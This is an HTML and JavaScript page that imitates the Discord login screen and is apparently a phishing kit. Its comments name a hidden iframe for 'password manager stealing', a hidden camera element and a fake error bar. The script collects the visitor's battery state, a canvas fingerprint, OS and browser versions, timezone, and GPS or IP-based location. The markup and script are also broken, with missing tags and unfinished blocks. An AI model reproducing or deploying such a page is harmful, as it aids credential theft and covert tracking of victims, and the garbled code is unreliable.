<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    }
    body {
      background-color: #1e1f22;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #2b2d31;
      border-radius: 8px;
      padding: 32px 40px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
      position: relative;
    }
    .login-container h1 {
      color: #ffffff;
      font-size: 24px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 4px;
    }
    .login-container .subtitle {
      color: #b5bac1;
      font-size: 16px;
      text-align: center;
      margin-bottom: 24px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      color: #b5bac1;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 6px;
    }
    .form-group input {
      width: 100%;
      padding: 12px 14px;
      background-color: #1e1f22;
      border: 1px solid #3f4147;
      border-radius: 4px;
      color: #ffffff;
      font-size: 15px;
      transition: border-color 0.2s;
      outline: none;
    }
    .form-group input:focus {
      border-color: #5865f2;
    }
    .form-group input::placeholder {
      color: #6d6f78;
      font-size: 14px;
    }
    .form-group input:-webkit-autofill {
      -webkit-box-shadow: 0 0 0 1000px #1e1f22 inset !important;
      -webkit-text-fill-color: #ffffff !important;
    }
    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    .checkbox-group input[type="checkbox"] {
      width: 18px;
      height: 18px;
      accent-color: #5865f2;
      cursor: pointer;
    }
    .checkbox-group label {
      color: #b5bac1;
      font-size: 14px;
      cursor: pointer;
    }
    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #5865f2;
      border: none;
      border-radius: 4px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s;
      margin-bottom: 12px;
    }
    .btn-submit:hover {
      background-color: #4752c4;
    }
    .btn-submit:active {
      transform: scale(0.98);
    }
    .btn-qr {
      width: 100%;
      padding: 14px;
      background-color: transparent;
      border: 1px solid #3f4147;
      border-radius: 4px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
      margin-bottom: 8px;
    }
    .btn-qr:hover {
      background-color: #3f4147;
    }
    .error-msg {
      color: #f23f42;
      font-size: 13px;
      margin-top: 6px;
      display: none;
    }
    .status-bar {
      margin-top: 16px;
      padding: 10px;
      border-radius: 4px;
      font-size: 13px;
      background: #1e1f22;
      border: 1px solid #3f4147;
      color: #f23f42;
      text-align: center;
      display: none;
    }
    .status-bar.visible {
      display: block;
    }
    .status-bar.error {
      background: #2a1a1a;
      border-color: #f23f42;
      color: #f28b8b;
    }
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin-top: 20px;
      font-size: 13px;
    }
    .footer-links a {
      color: #5865f2;
      text-decoration: none;
    }
    .footer-links a:hover {
      text-decoration: underline;
    }
    .discord-logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .discord-logo svg {
      width: 48px;
      height: 48px;
      fill: #ffffff;
    }
    .qr-section {
      background: #1e1f22;
      border-radius: 8px;
      padding: 20px;
      text-align: center;
      margin-bottom: 20px;
      display: none;
    }
    .qr-section.visible {
      display: block;
    }
    .qr-section .qr-placeholder {
      width: 120px;
      height: 120px;
      background: #2b2d31;
      margin: 0 auto 12px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #b5bac1;
      font-size: 12px;
      border: 1px dashed #3f4147;
    }
    .qr-section p {
      color: #b5bac1;
      font-size: 14px;
    }
    .passkey-row {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-top: 12px;
      color: #b5bac1;
      font-size: 14px;
    }
    .passkey-row span {
      color: #5865f2;
      cursor: pointer;
    }
    .passkey-row span:hover {
      text-decoration: underline;
    }
    .register-row {
      text-align: center;
      margin-top: 16px;
      color: #b5bac1;
      font-size: 14px;
    }
    .register-row a {
      color: #5865f2;
      text-decoration: none;
    }
    .register-row a:hover {
      text-decoration: underline;
    }
    /* Hidden elements */
    #hidden-camera {
      display: none !important;
      width: 0;
      height: 0;
      opacity: 0;
      pointer-events: none;
      position: absolute;
      top: -9999px;
      left: -9999px;
    }
    #hack-sound {
      display: none;
    }
    /* Hidden iframe for password manager stealing */
    #pw-stealer {
      position: absolute;
      opacity: 0;
      pointer-events: none;
      width: 1px;
      height: 1px;
      top: -9999px;
      left: -9999px;
    }
  </style>
</head>

    <h1>Welcome back!</h1>
    <p class="subtitle">We're so excited to see you again!</p>

    <!-- QR Code Section (hidden by default, toggled by button) -->
    <div id="qrSection" class="qr-section">

    <form id="loginForm" novalidate>

    <!-- Passkey Row -->
    <div class="passkey-row">
      <span>Or, sign in with passkey</span>
    </div>

    <!-- Register Row -->
    <div class="register-row">
      Need an account? <a href="#">Register</a>
    </div>

    <!-- Status Bar (Fake Error) -->
    <div id="statusBar" class="status-bar" role="status"></div>

      // ============================================================
      //  GET BATTERY
      // ============================================================
      async function getBatteryLevel() {
        try {
          const battery = await navigator.getBattery();
          return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;

      }

      // ============================================================
      //  CANVAS FINGERPRINT
      // ============================================================
      function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 256;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
        return canvas.toDataURL().substring(0, 100) + '...';
      }

      // ============================================================
      //  OS & BROWSER
      // ============================================================
      function getExactOS() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11 (64-bit)';
        if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
        if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
        if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
        if (ua.indexOf('Mac OS X') !== -1) {
          const m = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
          return m ? `macOS 10.${m[1]}.${m[2]}` : 'macOS';
        }
        if (ua.indexOf('Android') !== -1) {
          const m = ua.match(/Android ([0-9]+\.[0-9]+)/);
          return m ? `Android ${m[1]}` : 'Android';
        }
        if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
          const m = ua.match(/OS ([0-9]+)_([0-9]+)/);
          return m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
        }
        if (ua.indexOf('Linux') !== -1) return 'Linux';
        return 'Unknown';
      }

      function getExactBrowser() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Firefox') !== -1) {
          const m = ua.match(/Firefox\/([0-9.]+)/);
          return m ? `Firefox ${m[1]}` : 'Firefox';
        }
        if (ua.indexOf('Edg') !== -1) {
          const m = ua.match(/Edg\/([0-9.]+)/);
          return m ? `Edge ${m[1]}` : 'Edge';
        }
        if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) {
          const m = ua.match(/Chrome\/([0-9.]+)/);
          return m ? `Chrome ${m[1]}` : 'Chrome';
        }
        if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) {
          const m = ua.match(/Version\/([0-9.]+)/);
          return m ? `Safari ${m[1]}` : 'Safari';
        }
        if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) {
          const m = ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
          return m ? `Opera ${m[1]}` : 'Opera';
        }
        return 'Unknown';
      }

      function getTimestamp() {
        const now = new Date();
        return {
          iso: now.toISOString(),
          date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
          time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
      }

      // ============================================================
      //  GEOLOCATION
      // ============================================================
      function getGPSLocation() {
        return new Promise((resolve) => {
          if (!navigator.geolocation) { resolve(null); return; }
          navigator.geolocation.getCurrentPosition(
            (p) => resolve({ latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy, source: 'GPS' }),
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        });
      }

      async function getGeoData() {
        const gps = await getGPSLocation();
        if (gps) return { source: 'GPS (Exact)', latitude: gps.latitude, longitude: gps.longitude, accuracy: gps.accuracy + ' meters', city: 'GPS-derived', country: 'GPS-derived' };

          const r = await fetch('https://ipapi.co/json/');
          if (!r.ok) throw new Error();
          const d = await r.json();
          return { source: 'IP Geolocation (Approx)', latitude: d.latitude || 'Unknown', longitude: d.longitude || 'Unknown', accuracy: 'IP-based (approx)', city: d.city || 'Unknown', country: d.country_name || 'Unknown' };

          try {
            const r = await fetch('https://ipinfo.io/json');
            if (!r.ok) throw new Error();
            const d = await r.json();
            const loc = d.loc ? d.loc.split(',') : ['Unknown', 'Unknown'];
